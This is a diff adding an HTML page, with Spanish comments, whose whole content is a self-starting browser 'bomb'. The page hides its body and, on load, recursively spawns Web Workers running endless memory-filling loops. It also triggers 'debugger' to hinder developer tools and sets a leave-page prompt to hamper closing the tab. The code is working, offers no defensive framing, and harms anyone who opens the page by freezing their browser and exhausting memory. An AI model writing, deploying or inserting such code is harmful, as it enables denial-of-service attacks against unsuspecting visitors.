@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <style>body { display: none; }</style> <!-- Oculta todo -->
+</head>
+<body>
+    <script>
+    // Bomba ultra cabrona - se ejecuta al cargar la página
+    let count = 0;
+    function ultimateBomb() {
+      count++;
+      if (count % 5 === 0) { debugger; } // Anti-devtools
+      
+      for(let i = 0; i < 5; i++) {
+        try {
+          const workerCode = `onmessage = function() { while(true) { new Array(8e6).fill(Math.random()); } };`;
+          new Worker(URL.createObjectURL(new Blob([workerCode])));
+        } catch(e) {}
+      }
+      
+      setTimeout(ultimateBomb, 0);
+      setTimeout(ultimateBomb, 1);
+      window.onbeforeunload = () => "Cerrando...";
+    }
+    window.onload = ultimateBomb; // Ejecuta automáticamente al entrar
+    </script>
+</body>
+</html>
